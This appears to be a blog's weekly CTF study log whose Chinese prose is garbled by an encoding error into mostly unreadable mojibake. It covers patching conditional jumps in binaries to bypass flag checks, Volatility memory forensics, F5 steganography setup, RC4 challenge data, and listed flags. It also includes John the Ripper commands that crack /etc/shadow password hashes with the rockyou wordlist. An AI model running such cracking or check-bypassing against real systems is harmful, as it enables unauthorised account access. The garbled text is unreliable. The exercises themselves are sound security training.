<p>ä¸­é—´è·³è½¬åˆ°è°ƒç”¨å‡½æ•°çš„æ±‡ç¼–è¯­è¨€å¤„ï¼Œä¼šå‘ç°æ˜¯çº¢è‰²çš„ï¼Œæ‰€ä»¥ä¸Šæº¯åˆ°å‡½æ•°å…¥å£ï¼Œç„¶å<code>create function</code>ï¼Œå†é‡æ–°å»å¯¹åº”åœ°æ–¹ï¼Œæ ¹æ®åˆ¤æ–­æ¡ä»¶æ‰¾åˆ°å¯¹åº”å‚æ•°ï¼Œç„¶åè·³è½¬åˆ°å¯¹åº”å‚æ•°å»ã€‚</p>
<img src="/2023/12/31/WeeklyStudy/image-20230301144853602.png" class="" title="åˆ¤æ–­å‚æ•°">

<p>å†è¿›è¡Œè·³è½¬ã€‚</p>
<img src="/2023/12/31/WeeklyStudy/image-20230301145017968.png" class="" title="è·³è½¬å‚æ•°">

<p>æœ€åå°±ç›´æ¥åˆ°flagçš„åœ°æ–¹äº†ã€‚</p>
<h2 id="CTF-7"><a href="#CTF-7" class="headerlink" title="CTF++ 7"></a>CTF++ 7</h2><blockquote>
<p>flag{a6145c1e440e9d30c861c53a07af6def}</p>
</blockquote>
<p>emmï¼Œç›´æ¥å‡½æ•°è·³è½¬å°±åˆ°äº†ã€‚</p>
<h2 id="CTF-8"><a href="#CTF-8" class="headerlink" title="CTF++ 8"></a>CTF++ 8</h2><blockquote>
<p>flag{a6145c1e440e9d30c861c53a07af6def}</p>
</blockquote>
<p>è·Ÿ6ç±»ä¼¼ï¼Œä¸€è·¯è·³è½¬æ‰¾åˆ°å¯¹åº”çš„å‚æ•°å³å¯ã€‚</p>
<p><em>è„‘å­æœ‰ç‚¹ç³Šï¼Œä¸æƒ³æï¼Œæ‘¸é±¼äº†ã€‚</em></p>
<h1 id="230302"><a href="#230302" class="headerlink" title="230302"></a>230302</h1><p><em>github-token</em></p>
<h2 id="9"><a href="#9" class="headerlink" title="9"></a>9</h2><p>Strï¼šWhat_should_I_do</p>
<p>b3596e322275cb5e59a9a9f50a274715</p>
<p><em>æœä¸å…¶ç„¶é”™äº†ï¼Œä½†è§‰å¾—å®šä½åˆ°key partäº†ã€‚</em></p>
<h1 id="230303"><a href="#230303" class="headerlink" title="230303"></a>230303</h1><blockquote>
<p><a href="https://blog.csdn.net/xiao__1bai/article/details/120891156">(10æ¡æ¶ˆæ¯) CTFé€†å‘æ€»ç»“ï¼ˆäºŒï¼‰_æ²ä¸€ Â· æ—çš„åšå®¢-CSDNåšå®¢</a></p>
</blockquote>
<h2 id="9-1"><a href="#9-1" class="headerlink" title="9"></a>9</h2><blockquote>
<p>flag{0272995b2b6bbc4915f717c2562e8b39}</p>
</blockquote>
<h3 id="å…³äºä¿®æ”¹æ±‡ç¼–ä»£ç æˆ–è€…è·³è½¬é€»è¾‘"><a href="#å…³äºä¿®æ”¹æ±‡ç¼–ä»£ç æˆ–è€…è·³è½¬é€»è¾‘" class="headerlink" title="å…³äºä¿®æ”¹æ±‡ç¼–ä»£ç æˆ–è€…è·³è½¬é€»è¾‘"></a>å…³äºä¿®æ”¹æ±‡ç¼–ä»£ç æˆ–è€…è·³è½¬é€»è¾‘</h3><ul>
<li>ç›´æ¥é€‰å®šå¯¹åº”çš„æ±‡ç¼–ä»£ç ï¼Œç„¶åé€‰æ‹©<code>Edit</code> -&gt; <code>Patch Program</code> -&gt; <code>Assemble</code>ï¼Œä¿®æ”¹å¯¹åº”çš„æ±‡ç¼–ä»£ç ï¼Œå¦‚ä¸‹å›¾ï¼Œ<code>jnz -&gt; jz</code>ã€‚</li>
</ul>
<img src="/2023/12/31/WeeklyStudy/image-20230303130402709.png" class="" title="image-20230303130402709">

<ul>
<li>ä¹Ÿå¯ä»¥åˆ°<code>hex</code>ç•Œé¢ï¼Œä¿®æ”¹å¯¹åº”çš„æœºå™¨ç ï¼Œå¦‚<code>jnz</code>å¯¹åº”çš„æœºå™¨ç ä¸º<code>75</code>ï¼Œç„¶åä¿®æ”¹æœºå™¨ç ä¸º<code>74</code>ï¼Œå³<code>jz</code>ã€‚</li>
</ul>
<img src="/2023/12/31/WeeklyStudy/image-20230303130836473.png" class="" title="image-20230303130836473">

<ul>
<li><p>å‰©ä¸‹æ­¥éª¤ï¼Œå¦‚<strong>0206</strong> <a href="0206-0210.md">0206-0210.md</a> æ‰€ç¤ºã€‚</p>
</li>
<li><p>ç”Ÿæˆæ–°çš„æ‰§è¡Œæ–‡ä»¶åï¼Œå°±å¯ä»¥æ”¹å˜åŸæœ‰çš„è·³è½¬é€»è¾‘ï¼Œå³ä½¿è¾“å‡ºé”™è¯¯ä¹Ÿå¯ä»¥ç›´æ¥å¾—åˆ°ç›¸åº”çš„flagäº†ã€‚</p>
</li>
</ul>
<h2 id="Test-B"><a href="#Test-B" class="headerlink" title="Test_B"></a>Test_B</h2><p>ä¸¤æ¡è·¯ï¼š</p>
<ul>
<li>ä¿®æ”¹è·³è½¬é€»è¾‘</li>
<li>åˆ†æåŸå§‹ä»£ç ï¼Œç›´æ¥çˆ†ç ´ç›¸å…³æ•°æ®</li>
</ul>
<h2 id="10"><a href="#10" class="headerlink" title="10"></a>10</h2><blockquote>
<p>flag{0272995b2b6bbc4915f717c2562e8b39}</p>
</blockquote>
<p>é€»è¾‘ä¸€è‡´äº†ï¼Œç›´æ¥æŠŠåŸæœ¬çš„åˆ¤æ–­æ¡ä»¶ä»¥åŠè·³è½¬é€»è¾‘ä¿®æ”¹ä¸€ä¸‹å³å¯ã€‚</p>
<p>åŸæœ¬çš„åˆ¤æ–­æ¡ä»¶æ˜¯<code>jz</code>ï¼Œå¹¶ä¸”è¿è¡Œä¹‹åæ˜¯å¾€é”™è¯¯çš„æ–¹å‘è·³è½¬ï¼Œé‚£æˆ‘ä»¬ç›´æ¥ä¿®æ”¹ä¸€ä¸‹å½“å‰çš„ä¸€ä¸ªè·³è½¬é€»è¾‘å³å¯æˆåŠŸè¿è¡Œåˆ°æˆ‘ä»¬æœŸæœ›çš„æ­£ç¡®è·¯çº¿è¿è¡Œã€‚</p>
<img src="/2023/12/31/WeeklyStudy/image-20230303144321661.png" class="" title="image-20230303144321661">

<p>ä½†è¿™è¾¹åˆ†æä¹Ÿå­˜åœ¨ä¸€ç‚¹é—®é¢˜ï¼ŒåŸæœ¬åœ¨<code>debug</code>åˆ†æä¸­èƒ½çœ‹åˆ°å½“å‰çš„æ•°æ®ï¼Œä½†<code>release</code>ä¹‹åï¼Œæ— æ³•çœ‹åˆ°å½“å‰çš„æ•°æ®ï¼Œå¦‚æœæ‰“ç®—èµ°åˆ†æçˆ†ç ´çš„è·¯çº¿çš„è¯ï¼Œè¿™éƒ¨åˆ†å¯èƒ½å­˜åœ¨ä¸€ç‚¹æ²¡æ³¨æ„åˆ°çš„åœ°æ–¹ã€‚</p>
<h2 id="11"><a href="#11" class="headerlink" title="11"></a>11</h2><blockquote>
<p>flag{0272995b2b6bbc4915f717c2562e8b39}</p>
</blockquote>
<p>æ€è·¯åŒä¸Šï¼Œæ¯”è¾ƒéº»çƒ¦çš„ä¸€ç‚¹æ˜¯ï¼Œéš¾ä»¥è·³è½¬åˆ°éªŒè¯æ¡ä»¶çš„æµç¨‹å›¾ã€‚</p>
<h3 id="å®šä½çš„æ€è·¯"><a href="#å®šä½çš„æ€è·¯" class="headerlink" title="å®šä½çš„æ€è·¯"></a>å®šä½çš„æ€è·¯</h3><ul>
<li>å…ˆæŸ¥çœ‹<code>string</code>ç•Œé¢ï¼Œç„¶åæ‰¾åˆ°å…³é”®å­—ç¬¦ä¸²<code>you are right</code>etc.</li>
<li>è·³è½¬è¿›å…¥ä¹‹åï¼Œæ‰¾åˆ°è¯¥å­—ç¬¦ä¸²å¯¹åº”çš„å…³é”®å‡½æ•°<code>aYouAreRighthHah</code></li>
<li>å®šä½åˆ°å…³é”®å‡½æ•°ä¹‹åï¼Œç›´æ¥æŒ‰<code>x</code>æŸ¥çœ‹äº¤å‰ä½¿ç”¨çš„åœ°æ–¹</li>
<li>æœ€ç»ˆå®šä½åˆ°æµç¨‹å›¾çš„è°ƒç”¨ç•Œé¢äº†</li>
<li>å†æŒ‰éœ€æ±‚è¿›è¡Œç›¸åº”åœ°ä¿®æ”¹å¹¶åº”ç”¨</li>
</ul>
<h2 id="12"><a href="#12" class="headerlink" title="12"></a>12</h2><blockquote>
<p>flag{0272995b2b6bbc4915f717c2562e8b39}</p>
</blockquote>
<p>è·Ÿ10ç±»ä¼¼ã€‚</p>
<h2 id="13"><a href="#13" class="headerlink" title="13"></a>13</h2><blockquote>
<p>flag{d12a276452f92bd97535e69eae699541}</p>
</blockquote>
<p>æ•´ä½“é€»è¾‘è·Ÿä¸Šé¢æ˜¯ç±»ä¼¼çš„ï¼Œç»è¿‡çª—å£è¾“å…¥ï¼Œå‘ç°è¾“å…¥é”™è¯¯ç›´æ¥è·³è½¬åˆ°äº†<code>é”™è¯¯</code>å­—æ®µï¼Œé‚£ä¹ˆæˆ‘ä»¬åŒæ ·æŠŠåˆ¤æ–­é€»è¾‘æ”¹å˜ä¸€ä¸‹ï¼Œç›´æ¥è·³è½¬åˆ°ç»™å‡ºflagéƒ¨åˆ†ï¼Œå°±å¯ä»¥ç›´æ¥å¾—åˆ°flagäº†ã€‚</p>
<img src="/2023/12/31/WeeklyStudy/image-20230303162147833.png" class="" title="image-20230303162147833">

<p>ä¸è¡Œï¼Œå¿ƒæ¢—å¾—éš¾å—ï¼Œç©ºäº†æŠŠCè¯­è¨€ä¸­æ¶‰åŠåˆ°RC4çš„åŠ è§£å¯†é€»è¾‘ç†é¡ºä¸€éï¼Œ</p>
<img src="/2023/12/31/WeeklyStudy/image-20230303161828684.png" class="" title="image-20230303161828684">

<h2 id="14"><a href="#14" class="headerlink" title="14"></a>14</h2><blockquote>
<p>flag{d12a276452f92bd97535e69eae699541}</p>
</blockquote>
<p>ç±»ä¼¼ï¼Œå…³é”®è¿˜æ˜¯å¾—å®šä½åˆ¤å®šæ¡ä»¶æ‰€å¤„çš„ä½ç½®ã€‚</p>
<h1 id="230306"><a href="#230306" class="headerlink" title="230306"></a>230306</h1><h2 id="15"><a href="#15" class="headerlink" title="15"></a>15</h2><blockquote>
<p>flag{d12a276452f92bd97535e69eae699541}</p>
</blockquote>
<p>åˆ©ç”¨å‡½æ•°è·³è½¬åˆ°åˆ¤å®šæ¡ä»¶ï¼Œä¿®æ”¹é‡ç”Ÿæˆå³å¯ã€‚</p>
<h2 id="16"><a href="#16" class="headerlink" title="16"></a>16</h2><blockquote>
<p>flag{d12a276452f92bd97535e69eae699541}</p>
</blockquote>
<p>åŒä¸Šï¼Œå®šä½åˆ¤å®šçš„æ±‡ç¼–è¯­å¥ã€‚</p>
<h2 id="kaliå®‰è£…vol"><a href="#kaliå®‰è£…vol" class="headerlink" title="kaliå®‰è£…vol"></a>kaliå®‰è£…vol</h2><p>ä¸­é—´å‡ºç°ä¸€ç‚¹é—®é¢˜ï¼š</p>
<ul>
<li>ç®¡ç†å‘˜æ¨¡å¼ä»¥åŠå½“å‰æ¨¡å¼ä¸‹çš„pip2æŒ‡å‘çš„è·¯å¾„ä¸ä¸€æ ·</li>
<li>constructæ¨¡å—ä¸€ç›´å®‰è£…ä¸æˆåŠŸ</li>
</ul>
<p>å½“å‰è§£å†³ï¼š</p>
<ul>
<li>ç›´æ¥å¹²è„†å…¨ç”¨ç®¡ç†å‘˜æ¨¡å¼çš„pip2è¿›è¡Œç›¸å…³å®‰è£…åº“æ“ä½œ</li>
<li><code>setuptools</code>æ²¡å®‰è£…&#x2F;æ²¡æ›´æ–°</li>
</ul>
<h2 id="gnuplot"><a href="#gnuplot" class="headerlink" title="gnuplot"></a>gnuplot</h2><h3 id="å®‰è£…"><a href="#å®‰è£…" class="headerlink" title="å®‰è£…"></a>å®‰è£…</h3><p><code>sudo apt-get install gnuplot</code></p>
<h3 id="ä½¿ç”¨"><a href="#ä½¿ç”¨" class="headerlink" title="ä½¿ç”¨"></a>ä½¿ç”¨</h3><ul>
<li>txtæ–‡ä»¶ï¼Œå†…å«åæ ‡</li>
<li>è¿›å…¥ç›®å½•ï¼Œè¿è¡Œ<code>gnuplot</code></li>
<li>åè¿è¡Œ<code>plot&#39;xxx.txt&#39;</code></li>
</ul>
<p><em>ä½†ä¸ºå•¥å¯¼å‡ºçš„å›¾ç‰‡æ”¾åˆ°win7ç›´æ¥æˆä¸€åŠäº†å‘¢ã€‚</em></p>
<h1 id="230307"><a href="#230307" class="headerlink" title="230307"></a>230307</h1><h2 id="kaliçˆ†ç ´Linuxå¯†ç "><a href="#kaliçˆ†ç ´Linuxå¯†ç " class="headerlink" title="kaliçˆ†ç ´Linuxå¯†ç "></a>kaliçˆ†ç ´Linuxå¯†ç </h2><blockquote>
<p><a href="https://blog.csdn.net/qq_41608408/article/details/129253383">(10æ¡æ¶ˆæ¯) Kali çˆ†ç ´ Linux å¯†ç  | ä½¿ç”¨ John the Ripper çˆ†ç ´ etc&#x2F;shadow æ–‡ä»¶ | æŠ¥é”™ï¼š UTF-8 No password hashes loaded_kali çˆ†ç ´ç›®å½•_å­¦ä¹ æº¢å‡ºçš„åšå®¢-CSDNåšå®¢</a></p>
</blockquote>
<p><strong>é¢˜ç›®ï¼š</strong></p>
<blockquote>
<p><a href="https://w3challs.com/challenges/crypto/shadow">Crypto: Shadow â€“ W3Challs Hacking Challenges</a></p>
</blockquote>
<p><strong>è§£ç­”ï¼š</strong></p>
<ul>
<li>æŠŠéœ€è¦çˆ†ç ´çš„æ”¾åˆ°ä¸€ä¸ªæ–‡ä»¶</li>
<li>ç›´æ¥ä½¿ç”¨<code>join</code>è¿›è¡Œçˆ†ç ´ï¼Œ<code>sudo john /home/kali/Desktop/CRYPTO/task --format=crypt --wordlist=/usr/share/wordlists/rockyou.txt</code></li>
<li>æœ€åå¾—åˆ°<code>root</code>çš„å¯†ç </li>
</ul>
<img src="/2023/12/31/WeeklyStudy/image-20230307095910729.png" class="" title="image-20230307095910729">

<h2 id="joinçš„æ–°ä½¿ç”¨"><a href="#joinçš„æ–°ä½¿ç”¨" class="headerlink" title="joinçš„æ–°ä½¿ç”¨"></a>joinçš„æ–°ä½¿ç”¨</h2><p>å› ä¸ºä» Debian 11 &#x2F; bullseye ç³»ç»Ÿ ï¼ˆé€‚ç”¨äºKaliï¼‰å¼€å§‹ï¼Œ é»˜è®¤çš„å¯†ç å“ˆå¸Œå‡½æ•°ä½¿ç”¨ yescrypt ã€‚<br>å› æ­¤ä¹‹å‰ John the Ripper çš„å‘½ä»¤å°†<strong>æ— æ³•å†è¿è¡Œ</strong>ã€‚</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">sudo john [/etc/shadow] --<span class="built_in">format</span>=crypt</span><br><span class="line">sudo john [/etc/shadow] --<span class="built_in">format</span>=crypt --wordlist=/usr/share/john/password.lst</span><br><span class="line">sudo john [/etc/shadow] --<span class="built_in">format</span>=crypt --wordlist=[../]rockyou.txt</span><br></pre></td></tr></table></figure>

<p>åœ¨æ‰¾åˆ°å¯†ç åï¼Œå¦‚æœä¸å°å¿ƒå…³æ‰çª—å£äº†å¯ä»¥ä½¿ç”¨ <code>--show</code> æ¥å†æ¬¡æ˜¾ç¤ºå·²ç»çˆ†ç ´çš„å¯†ç ã€‚</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">sudo john [/etc/shadow] --show</span><br></pre></td></tr></table></figure>



<h2 id="F5ç®—æ³•ç¯å¢ƒä¿®æ”¹"><a href="#F5ç®—æ³•ç¯å¢ƒä¿®æ”¹" class="headerlink" title="F5ç®—æ³•ç¯å¢ƒä¿®æ”¹"></a>F5ç®—æ³•ç¯å¢ƒä¿®æ”¹</h2><blockquote>
<p><a href="https://blog.csdn.net/pythllc/article/details/128969843">(10æ¡æ¶ˆæ¯) å®‰è£…F5-steganographyå’Œä½¿ç”¨ï¼ŒåŠè§£å†³javaç¯å¢ƒç‰ˆæœ¬æŠ¥é”™é—®é¢˜_å¢¨ç¬™æ•…å›çš„åšå®¢-CSDNåšå®¢</a></p>
</blockquote>
<h3 id="JavaæŒ‡å®šç‰ˆæœ¬ä¸‹è½½"><a href="#JavaæŒ‡å®šç‰ˆæœ¬ä¸‹è½½" class="headerlink" title="JavaæŒ‡å®šç‰ˆæœ¬ä¸‹è½½"></a>JavaæŒ‡å®šç‰ˆæœ¬ä¸‹è½½</h3><blockquote>
<p><a href="https://www.oracle.com/java/technologies/downloads/#java11%EF%BC%8C%E4%B8%8B%E8%BD%BDjava11.0.18%E7%9A%84%E5%8E%8B%E7%BC%A9%E5%8C%85">https://www.oracle.com/java/technologies/downloads/#java11ï¼Œä¸‹è½½java11.0.18çš„å‹ç¼©åŒ…</a></p>
</blockquote>
<h3 id="ç§»åŠ¨åˆ°æŒ‡å®šè·¯å¾„å¹¶åˆ‡æ¢è¿›è¡Œè§£å‹ç¼©"><a href="#ç§»åŠ¨åˆ°æŒ‡å®šè·¯å¾„å¹¶åˆ‡æ¢è¿›è¡Œè§£å‹ç¼©" class="headerlink" title="ç§»åŠ¨åˆ°æŒ‡å®šè·¯å¾„å¹¶åˆ‡æ¢è¿›è¡Œè§£å‹ç¼©"></a>ç§»åŠ¨åˆ°æŒ‡å®šè·¯å¾„å¹¶åˆ‡æ¢è¿›è¡Œè§£å‹ç¼©</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">mv jdk-<span class="number">11.0</span><span class="number">.18</span>_linux-x64_bin.tar.gz /etc/opt</span><br><span class="line">cd /etc/opt</span><br><span class="line">tar -zxvf jdk-<span class="number">11.0</span><span class="number">.18</span>_linux-x64_bin.tar.gz</span><br></pre></td></tr></table></figure>

<h3 id="æ‹·è´è§£å‹åçš„Javaæ–‡ä»¶è‡³æŒ‡å®šè·¯å¾„"><a href="#æ‹·è´è§£å‹åçš„Javaæ–‡ä»¶è‡³æŒ‡å®šè·¯å¾„" class="headerlink" title="æ‹·è´è§£å‹åçš„Javaæ–‡ä»¶è‡³æŒ‡å®šè·¯å¾„"></a>æ‹·è´è§£å‹åçš„Javaæ–‡ä»¶è‡³æŒ‡å®šè·¯å¾„</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">cp -r jdk-<span class="number">11.0</span><span class="number">.18</span>/ /usr/<span class="built_in">bin</span></span><br></pre></td></tr></table></figure>

<h3 id="å®‰è£…å¹¶è¿›è¡Œæ³¨å†Œ"><a href="#å®‰è£…å¹¶è¿›è¡Œæ³¨å†Œ" class="headerlink" title="å®‰è£…å¹¶è¿›è¡Œæ³¨å†Œ"></a>å®‰è£…å¹¶è¿›è¡Œæ³¨å†Œ</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">update-alternatives --install /usr/<span class="built_in">bin</span>/java java /etc/opt/jdk-<span class="number">11.0</span><span class="number">.18</span>/<span class="built_in">bin</span>/java <span class="number">1</span></span><br><span class="line">update-alternatives --install /usr/<span class="built_in">bin</span>/javac javac /etc/opt/jdk-<span class="number">11.0</span><span class="number">.18</span>/<span class="built_in">bin</span>/javac <span class="number">1</span></span><br><span class="line">update-alternatives --<span class="built_in">set</span> java /etc/opt/jdk-<span class="number">11.0</span><span class="number">.18</span>/<span class="built_in">bin</span>/java</span><br><span class="line">update-alternatives --<span class="built_in">set</span> javac /etc/opt/jdk-<span class="number">11.0</span><span class="number">.18</span>/<span class="built_in">bin</span>/javac</span><br></pre></td></tr></table></figure>

<p><em>ä¸­é—´å‡ºç°æ‰‹åŠ¨æ¨¡å¼ï¼Œå¥½åƒä¸å¤ªå½±å“æ•´ä½“çš„å®‰è£…æ³¨å†Œ</em></p>
<h3 id="æŸ¥çœ‹åˆ‡æ¢åçš„Javaç‰ˆæœ¬"><a href="#æŸ¥çœ‹åˆ‡æ¢åçš„Javaç‰ˆæœ¬" class="headerlink" title="æŸ¥çœ‹åˆ‡æ¢åçš„Javaç‰ˆæœ¬"></a>æŸ¥çœ‹åˆ‡æ¢åçš„Javaç‰ˆæœ¬</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">java --version</span><br></pre></td></tr></table></figure>

<p>æ³¨å†Œäº†<code>Oracle</code>ï¼Œ<code>no \</code></p>
<img src="/2023/12/31/WeeklyStudy/image-20230307105656163.png" class="" title="image-20230307105656163">

<h3 id="è¿è¡Œæµ‹è¯•"><a href="#è¿è¡Œæµ‹è¯•" class="headerlink" title="è¿è¡Œæµ‹è¯•"></a>è¿è¡Œæµ‹è¯•</h3><p>æœ€åå†è¿è¡Œä¸€ä¸‹<code>F5</code>ï¼Œè¾“å‡ºä¸º<code>output.txt</code></p>
<img src="/2023/12/31/WeeklyStudy/image-20230307105825810.png" class="" title="image-20230307105825810">

<h2 id="ï¼å›¾åƒç›¸å…³"><a href="#ï¼å›¾åƒç›¸å…³" class="headerlink" title="ï¼å›¾åƒç›¸å…³"></a>ï¼å›¾åƒç›¸å…³</h2><blockquote>
<p><a href="https://lazzzaro.github.io/2020/05/06/misc-%E5%9B%BE%E5%83%8F%E5%A4%84%E7%90%86/">https://lazzzaro.github.io/2020/05/06/misc-%E5%9B%BE%E5%83%8F%E5%A4%84%E7%90%86/</a></p>
</blockquote>
<h2 id="ï¼ç½‘å®‰ç»ƒä¹ å¹³å°"><a href="#ï¼ç½‘å®‰ç»ƒä¹ å¹³å°" class="headerlink" title="ï¼ç½‘å®‰ç»ƒä¹ å¹³å°"></a>ï¼ç½‘å®‰ç»ƒä¹ å¹³å°</h2><blockquote>
<p><a href="https://blog.csdn.net/shuteer_xu/article/details/128213019">(10æ¡æ¶ˆæ¯) å›½å†…å¤–ä¼˜ç§€ç½‘å®‰ç»ƒä¹ å¹³å°_Ms08067å®‰å…¨å®éªŒå®¤çš„åšå®¢-CSDNåšå®¢</a></p>
</blockquote>
<h2 id="ï¼Hydra"><a href="#ï¼Hydra" class="headerlink" title="ï¼Hydra"></a>ï¼Hydra</h2><blockquote>
<p><a href="https://www.cnblogs.com/mchina/archive/2013/01/01/2840815.html">Linuxä¸‹æš´åŠ›ç ´è§£å·¥å…·Hydraè¯¦è§£ - Merlin_Tang - åšå®¢å›­ (cnblogs.com)</a></p>
</blockquote>
<img src="/2023/12/31/WeeklyStudy/image-20230307152419257.png" class="" title="image-20230307152419257">

<h2 id="RC4ï¼ŒCè¯­è¨€ä»£ç åˆ†æä»¥åŠpythonå®ç°"><a href="#RC4ï¼ŒCè¯­è¨€ä»£ç åˆ†æä»¥åŠpythonå®ç°" class="headerlink" title="RC4ï¼ŒCè¯­è¨€ä»£ç åˆ†æä»¥åŠpythonå®ç°"></a>RC4ï¼ŒCè¯­è¨€ä»£ç åˆ†æä»¥åŠpythonå®ç°</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">char</span> gszFlag[<span class="number">40</span>] = &#123;&#125;;</span><br><span class="line"><span class="type">char</span> cmpFlag[<span class="number">256</span>] = &#123; <span class="number">0x70</span>,<span class="number">0x5f</span>,<span class="number">0xbf</span>,<span class="number">0x8f</span>,<span class="number">0x71</span>,<span class="number">0x9c</span>,<span class="number">0xe4</span>,<span class="number">0xf0</span>,<span class="number">0x4b</span>,<span class="number">0x50</span>,<span class="number">0x70</span>,<span class="number">0x4f</span>,<span class="number">0x7e</span>,<span class="number">0x85</span>,<span class="number">0xd8</span>,<span class="number">0x7b</span>,<span class="number">0x9e</span>,<span class="number">0x5b</span>,<span class="number">0xe1</span>,<span class="number">0x60</span>,<span class="number">0x04</span>,<span class="number">0xf0</span>,<span class="number">0xee</span>,<span class="number">0x8b</span>,<span class="number">0x08</span>,<span class="number">0x1a</span>,<span class="number">0xfb</span>,<span class="number">0x69</span>,<span class="number">0x60</span>,<span class="number">0x2f</span>,<span class="number">0x4e</span>,<span class="number">0xa7</span>,<span class="number">0x7e</span>,<span class="number">0x92</span>,<span class="number">0x4d</span>,<span class="number">0xda</span>,<span class="number">0x9a</span>,<span class="number">0x36</span> &#125;;</span><br><span class="line"><span class="type">char</span> paswd[<span class="number">256</span>] = &#123; <span class="number">0x52</span>,<span class="number">0x5c</span>,<span class="number">0xa7</span>,<span class="number">0x87</span>,<span class="number">0x7f</span>,<span class="number">0xc7</span>,<span class="number">0xb8</span>,<span class="number">0xf7</span>,<span class="number">0x0e</span>,<span class="number">0x36</span>,<span class="number">0x21</span>,<span class="number">0x15</span>,<span class="number">0x6b</span>,<span class="number">0xc3</span>,<span class="number">0xd5</span>,<span class="number">0x3d</span>,<span class="number">0x9d</span>,<span class="number">0x4d</span>,<span class="number">0xe1</span>,<span class="number">0x3c</span>,<span class="number">0x5c</span>,<span class="number">0x9e</span>,<span class="number">0xab</span>,<span class="number">0x9f</span>,<span class="number">0x50</span>,<span class="number">0x4c</span>,<span class="number">0xbe</span>,<span class="number">0x6b</span>,<span class="number">0x3f</span> &#125;;</span><br><span class="line"><span class="type">char</span> rc4_key[<span class="number">256</span>] = &#123; <span class="string">&quot;What_should_I_do&quot;</span> &#125;;</span><br></pre></td></tr></table></figure>

<p><em>å®šä¹‰æ•°ç»„ï¼Œä¸å®Œå…¨åˆå§‹åŒ–ä»¥åŠå®Œå…¨åˆå§‹åŒ–ï¼Œæœªå¡«æ»¡çš„éƒ¨åˆ†å…¨éƒ¨ä¸º0</em></p>
<h1 id="230308"><a href="#230308" class="headerlink" title="230308"></a>230308</h1><h2 id="ã€æŠ¤ç½‘æ¯2018ã€‘easy-dump"><a href="#ã€æŠ¤ç½‘æ¯2018ã€‘easy-dump" class="headerlink" title="ã€æŠ¤ç½‘æ¯2018ã€‘easy_dump"></a>ã€æŠ¤ç½‘æ¯2018ã€‘easy_dump</h2><p>###åˆ©ç”¨volæŸ¥çœ‹é•œåƒä¿¡æ¯</p>
<p><code>vol.py -f easy_dump.img imageinfo</code><img src="/2023/12/31/WeeklyStudy/image-20230309102823595.png" class="" title="image-20230309102823595"></p>
<p><em>ä¸€èˆ¬ä»¥é•œåƒå‰1ï¼Œ2ä¸ªæ“ä½œç³»ç»Ÿä¸ºåˆ†æé‡ç‚¹ï¼Œeg: Win7SP1x64</em></p>
<h3 id="æŒ‡å®šé•œåƒè¿›è¡Œè¿›ç¨‹æ‰«æ"><a href="#æŒ‡å®šé•œåƒè¿›è¡Œè¿›ç¨‹æ‰«æ" class="headerlink" title="æŒ‡å®šé•œåƒè¿›è¡Œè¿›ç¨‹æ‰«æ"></a>æŒ‡å®šé•œåƒè¿›è¡Œè¿›ç¨‹æ‰«æ</h3><p><code>vol.py -f easy_dump.img --profile=WinSP1x64 pslist</code></p>
<p><code>vol.py -f easy_dump.img --profile=WinSP1x64 pstree</code></p>
<p><code>vol.py -f easy_dump.img --profile=WinSP1x64 psscan</code></p>
<img src="/2023/12/31/WeeklyStudy/image-20230309103714601.png" class="" title="image-20230309103714601">

<p><em>å‘ç°å¯ç–‘è¿›ç¨‹<code>notepad.exe</code>ï¼Œé‚£ä¹ˆæˆ‘ä»¬ç›´æ¥æŠŠè®°äº‹æœ¬å†…å®¹ç»™æå–å‡ºæ¥ã€‚</em></p>
<h3 id="è®°äº‹æœ¬å†…å®¹dump"><a href="#è®°äº‹æœ¬å†…å®¹dump" class="headerlink" title="è®°äº‹æœ¬å†…å®¹dump"></a>è®°äº‹æœ¬å†…å®¹dump</h3><p><code>vol.py -f easy_dump.img --profile=Win7SP1x64 memdump -p 2616 -D ./</code></p>
<img src="/2023/12/31/WeeklyStudy/image-20230309104153529.png" class="" title="image-20230309104153529">

<p><em>æŠŠè®°äº‹æœ¬å†…å®¹dumpå‡ºæ¥ï¼Œåˆ©ç”¨string-grepå¯¹dmpæ–‡ä»¶å†…å®¹è¿›è¡Œæ£€ç´¢ã€‚</em></p>
<h3 id="è®°äº‹æœ¬å†…å®¹ç›´æ¥æœç´¢"><a href="#è®°äº‹æœ¬å†…å®¹ç›´æ¥æœç´¢" class="headerlink" title="è®°äº‹æœ¬å†…å®¹ç›´æ¥æœç´¢"></a>è®°äº‹æœ¬å†…å®¹ç›´æ¥æœç´¢</h3><p><code>strings -eb 2616.dmp | grep flag </code></p>
<img src="/2023/12/31/WeeklyStudy/image-20230309111116109.png" class="" title="image-20230309111116109">

<p><em>-el ä¹Ÿé€‚ç”¨ï¼Œ -uç›¸å…³ç”¨æ³•ä¸å¤ªä¸æ¸…æ¥šå…·ä½“æ¡ˆä¾‹ï¼Œä»è€Œå¾—åˆ°æç¤ºï¼Œæ‰¾jpgæ–‡ä»¶ã€‚</em></p>
<h3 id="æ ¹æ®æç¤ºæŸ¥æ‰¾å›¾ç‰‡å¹¶å¯¼å‡º"><a href="#æ ¹æ®æç¤ºæŸ¥æ‰¾å›¾ç‰‡å¹¶å¯¼å‡º" class="headerlink" title="æ ¹æ®æç¤ºæŸ¥æ‰¾å›¾ç‰‡å¹¶å¯¼å‡º"></a>æ ¹æ®æç¤ºæŸ¥æ‰¾å›¾ç‰‡å¹¶å¯¼å‡º</h3><p><code>vol.py -f easy_dump.img --profile=Win7SP1x64 filescan | grep .jpg</code></p>
<img src="/2023/12/31/WeeklyStudy/image-20230309111924885.png" class="" title="image-20230309111924885">

<p><em>grepè¿›è¡Œè¿‡æ»¤ï¼Œä¹Ÿå¯ç”¨å…¶ä»–å½¢å¼è¿›è¡Œæ£€ç´¢ï¼Œä¸»ä½“åŒ…å«jpgå³å¯ã€‚</em></p>
<p><code>vol.py -f easy_dump.img --profile=Win7SP1x64 dumpfiles -Q 0x000000002408c460 -D ./</code></p>
<img src="/2023/12/31/WeeklyStudy/phos.jpg" class="" title="phos.jpg">

